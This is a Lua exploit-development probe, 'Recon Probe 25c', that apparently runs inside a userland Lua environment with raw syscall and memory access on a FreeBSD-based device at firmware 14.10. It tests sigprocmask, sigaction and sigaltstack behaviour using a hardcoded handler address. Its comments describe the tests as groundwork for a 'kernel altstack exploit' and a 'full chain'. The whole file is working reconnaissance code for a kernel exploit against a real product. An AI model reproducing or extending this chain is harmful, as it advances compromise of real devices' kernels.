-- 14.10 Recon Probe 25c: sigprocmask reliability test
-- Probe 25 crashed because signal delivered despite block
-- Need to verify sigprocmask actually works before using it
-- Strategy: block signal, send it, verify pending, then discard via SIG_IGN

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGPROCMASK TEST ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_sigpending = 343,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local mask = memory.alloc(16)
local old_mask = memory.alloc(16)
local pend = memory.alloc(16)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Basic sigprocmask read/write
-- ============================================================
log("")
log("--- PART 1: sigprocmask basics ---")

-- Read current mask (SIG_SETMASK with null new = read only?)
-- Actually on FreeBSD, if new is non-NULL it sets, if NULL it just reads old
-- But we can't pass NULL in Lua... use SIG_BLOCK with empty mask
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
memory.write_qword(old_mask, 0xDEADDEAD)
memory.write_qword(old_mask + 8, 0xDEADDEAD)

local pm1_ok, pm1_ret = pcall(function()
    return syscall.sc_sigprocmask(1, mask, old_mask) -- SIG_BLOCK=1, empty mask
end)
local om1_lo = memory.read_dword(old_mask):tonumber()
local om1_hi = memory.read_dword(old_mask + 4):tonumber()
log(string.format("  current mask: 0x%08x%08x rv=%s",
    om1_hi, om1_lo, pm1_ok and tostring(pm1_ret:tonumber()) or "ERR"))

-- ============================================================
-- PART 2: Block SIGUSR1 (30), verify it's blocked
-- ============================================================
log("")
log("--- PART 2: block SIGUSR1 ---")

-- FreeBSD sigset: signal N uses bit (N-1) in __bits[(N-1)/32]
-- SIGUSR1=30: bit 29 in word 0
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
memory.write_dword(mask, 0x20000000) -- bit 29 = 2^29 = 0x20000000

local pm2_ok, pm2_ret = pcall(function()
    return syscall.sc_sigprocmask(1, mask, old_mask) -- SIG_BLOCK
end)
log(string.format("  block bit29: rv=%s", pm2_ok and tostring(pm2_ret:tonumber()) or "ERR"))

-- Read back
memory.write_qword(mask, 0)
memory.write_qword(old_mask, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end) -- SIG_BLOCK empty = read
local om2_lo = memory.read_dword(old_mask):tonumber()
log(string.format("  mask after block: 0x%08x (bit29=%s)",
    om2_lo, (om2_lo >= 0x20000000) and "SET" or "clear"))

-- ============================================================
-- PART 3: Set SIGUSR1 to SIG_IGN, send it while blocked
-- ============================================================
log("")
log("--- PART 3: send blocked IGN signal ---")

for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

local k1_ok, k1_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) blocked+IGN: rv=" ..
    (k1_ok and tostring(k1_ret:tonumber()) or "ERR"))

-- Check pending
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p1_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending: 0x%08x (bit29=%s)",
    p1_lo, (p1_lo >= 0x20000000) and "SET" or "clear"))

local alive1 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive1))

-- Unblock
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end) -- SIG_SETMASK=3
log("  unblocked all")

local alive2 = pcall(function() return syscall.sc_getpid() end)
log("  alive after unblock: " .. tostring(alive2))

-- ============================================================
-- PART 4: Block SIGUSR1, set REAL handler, send, verify pending
-- Then change to SIG_IGN, unblock
-- This is the critical test for the kernel altstack exploit
-- ============================================================
log("")
log("--- PART 4: block + real handler + pending ---")

-- Block SIGUSR1
memory.write_dword(mask, 0x20000000) -- bit 29
memory.write_dword(mask + 4, 0)
memory.write_qword(mask + 8, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end)

-- Verify blocked
memory.write_qword(mask, 0)
memory.write_qword(old_mask, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end)
local bk = memory.read_dword(old_mask):tonumber()
log(string.format("  blocked mask: 0x%08x", bk))

-- Set real handler (crash handler)
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4) -- crash handler lo
memory.write_dword(sa_new + 4, 0)      -- crash handler hi
memory.write_dword(sa_new + 8, 0x0040) -- SA_SIGINFO only (no SA_ONSTACK)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  set real handler (no ONSTACK)")

-- Send SIGUSR1 while blocked
local k2_ok, k2_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) blocked+handler: rv=" ..
    (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

-- Check pending — SIGUSR1 should be pending
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p2_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending: 0x%08x (bit29=%s)",
    p2_lo, (p2_lo >= 0x20000000) and "SET" or "clear"))

local alive3 = pcall(function() return syscall.sc_getpid() end)
log("  alive (still blocked): " .. tostring(alive3))

-- NOW: change handler to SIG_IGN before unblocking
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  changed to SIG_IGN")

-- Unblock — pending signal should be discarded (IGN)
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end)
log("  unblocked")

local alive4 = pcall(function() return syscall.sc_getpid() end)
log("  alive after unblock: " .. tostring(alive4))

-- Check pending cleared
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p3_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending after unblock: 0x%08x", p3_lo))

-- ============================================================
-- PART 5: THE REAL TEST
-- Block SIGUSR1, set real handler + SA_ONSTACK + kernel altstack
-- Send signal (pending), change handler to SIG_IGN, disable
-- altstack, unblock — if this works, we have the full chain
-- ============================================================
log("")
log("--- PART 5: full chain test (user altstack) ---")

local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local STACK_SZ = 16384
local test_stack = memory.alloc(STACK_SZ)

-- Fill with pattern
for i = 0, STACK_SZ - 4, 4 do
    memory.write_dword(test_stack + i, 0x22220000 + i)
end

-- Set user altstack
memory.write_qword(ss_new, test_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Block SIGUSR1
memory.write_dword(mask, 0x20000000)
memory.write_dword(mask + 4, 0)
memory.write_qword(mask + 8, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end)

-- Set real handler + SA_ONSTACK + SA_SIGINFO
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- Send (stays pending)
pcall(function() syscall.sc_kill(pid, 30) end)

-- Check pending
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p4_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending with handler+ONSTACK: 0x%08x", p4_lo))

-- Change to SIG_IGN
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- Disable altstack
memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Unblock
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end)

local alive5 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive5))

-- Check altstack modification
local modified = 0
for i = 0, STACK_SZ - 4, 4 do
    local v = memory.read_dword(test_stack + i):tonumber()
    if v ~= 0x22220000 + i then
        modified = modified + 1
    end
end
log("  altstack modified dwords: " .. modified)

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

log("")
log("=== SIGPROCMASK TEST DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
